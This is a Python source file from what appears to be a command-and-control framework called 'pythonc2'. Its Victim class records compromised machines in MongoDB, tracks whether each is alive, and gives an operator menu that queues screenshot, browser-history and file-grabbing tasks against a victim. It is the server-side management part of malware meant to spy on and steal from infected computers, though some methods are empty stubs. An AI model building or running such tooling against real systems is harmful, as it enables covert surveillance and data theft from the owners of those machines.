import datetime
import pdb
import random
import string
from lib.task import Task
class Victim:

	mongoclient = None
	victims = {}
	module_hash = {'Windows' : ['screenshot','browser_history'], 'Linux': ['screenshot']}

	def __init__(self,victim_id,platform,os_version,lastseen = datetime.datetime.now(),add_db = True):
		self.victim_id = victim_id
		self.platform = platform
		self.os_version = os_version
		self.lastseen = lastseen

		self.victims[self.victim_id] = self
		self.modules = self.module_hash[self.platform]
		self.tasks = {}
		## To prevent adding to db when we are running load_victims_from_db
		if add_db : self.add_victim_to_db()

	## Shows the various victim present in the db/connected with the server. maybe dead or alive.
	@classmethod
	def show_victims(cls):
		print('\n'.join(cls.victims.keys()))


	@classmethod
	## Shows victim help menu
	def display_victim_help_menu(cls):
		commands = {'info':'Shows current victim information.' , 'modules': 'Shows modules executable on current victim.', 'tasks':'Show the task issued to the current victim and if there is output','back': 'Go back to main menu.'}

		for command in commands.keys():
			print(command + " ---> " + commands[command])

	## This will load the victim info present in DB, created from server.py and instanitate objects for them.
	@classmethod
	def load_victims_from_db(cls):
		mydb = cls.mongoclient["pythonc2"]
		victims = mydb["victims"]

		victim_list = victims.find()

		for victim in victim_list:
			if ('sample' not in victim) and (victim['victim_id'] not in Victim.victims.keys()):
				Victim(victim['victim_id'],victim['platform'],victim['os_version'],victim['lastseen'],False)


	## Gets the last seen of the victim. If lastseen > 60secs, vicitim considered dead.
	def get_victim_health_status(self):
		time = datetime.datetime.now() - self.lastseen
		if time.total_seconds() > 60:
			print("Victim Dead. Seen "+str(time.total_seconds())+" secs ago.")
		else:
			print("Victim alive. Seen "+str(time.total_seconds())+" secs ago.")

	## Called from main side, to update the last seen according to db
	def update_last_seen_from_db(self):
		mydb = self.mongoclient["pythonc2"]
		victims = mydb["victims"]
		h = {'victim_id':self.victim_id}

		victim = victims.find_one(h)

		if victim:
			self.lastseen = victim['lastseen']

	## Gets the various info of the victim. Trigerred by the info command.
	def get_victim_info(self):
		self.update_last_seen_from_db()
		print(f"ID - {self.victim_id} \nPlatform - {self.platform} \nOS Version - {self.os_version} \nlastseen - {self.lastseen}")
		self.get_victim_health_status()

	def show_tasks(self):\
		## TODO - update from db before showing if you want output or issuance status
		for key in self.tasks.keys():
			task_obj = self.tasks[key]
			print(f"Task ID - {task_obj.task_id} \nCommand - {task_obj.command} \nCommand Output - {task_obj.output} \nIssued - {task_obj.issued}")


	## Displays the victim menu
	def victim_menu(self):
		self.display_victim_help_menu()

		while True:
			print("Enter Victim based commands..")
			cmd = str(input())

			if cmd == 'info':
				self.get_victim_info()

			elif cmd == 'modules':
				print(self.modules)

			elif cmd == 'getfiles' or cmd == 'screenshot' or cmd == 'browser_history':
				if cmd in self.modules:
					task_id = ''.join(random.choices(string.ascii_lowercase +string.digits, k = 7))
					task = Task(victim_id = self.victim_id ,command = cmd,task_id = task_id)
					self.tasks[task.task_id] = task
				else:
					print('Command not supported. See the supported ones by running modules command')
			elif cmd ==  'tasks':
				self.show_tasks()
			elif cmd == 'back':
				print("Going back to main menu...")
				return

			elif cmd == 'help':
				self.display_victim_help_menu()

			else:
				print("Not supported")

	def add_victim_to_db(self):

		mydb = self.mongoclient["pythonc2"]
		victims = mydb["victims"]

		h = {'victim_id' : self.victim_id, 'platform' : self.platform ,'os_version' : self.os_version, 'lastseen' : self.lastseen}

		victims.insert_one(h)



	## Checks if a victim id is present in the DB.
	def victim_present(self,myclient,victim_id):
		pass


	## Checks if the command issued is supported or not by the victim
	def is_command_supported(self,myclient,victim_id,cmd):
		pass


	## Updates last seen whenever a new request is seen from the victim
	def update_last_seen_to_db(self):
		time = datetime.datetime.now()

		self.lastseen = time

		## Update in DB too.. TODO - NEEDED?
		mydb = self.mongoclient["pythonc2"]
		victims = mydb["victims"]
		h = {'victim_id':self.victim_id}
		victims.find_one_and_update(h,{ "$set": { "lastseen": time } })


class WindowsVictim(Victim):
	pass


class LinuxVictim(Victim):
	pass


class MacVictim(Victim):
	pass